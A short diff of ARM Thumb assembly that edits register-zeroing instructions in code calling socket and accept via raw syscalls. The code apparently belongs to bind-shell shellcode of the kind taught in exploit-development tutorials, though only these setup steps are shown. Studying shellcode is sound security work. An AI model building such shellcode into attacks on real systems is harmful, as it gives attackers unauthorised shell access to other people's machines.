@@ -23,7 +23,7 @@ _start:
   
     .code 16
     // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
-    eor    r2, r2, r2   // r2 = IPPROTO_IP
+    eor    r2, r2       // r2 = IPPROTO_IP
     mov    r1, #1       // r1 = SOCK_STREAM
     lsl    r7, r1, #8   // r7 = 1*256
     add    r7, #25      // r7 = 281 = socket 
@@ -48,8 +48,8 @@ _start:
     svc    1    
     
     // r = accept(s, 0, 0);
-    eor    r2, r2, r2   // r2 = 0
-    eor    r1, r1, r1   // r1 = 0
+    eor    r2, r2       // r2 = 0
+    eor    r1, r1       // r1 = 0
     mov    r0, r8       // r0 = s
     add    r7, #1       // r7 = 284+1 = 285 = accept    
     svc    1    
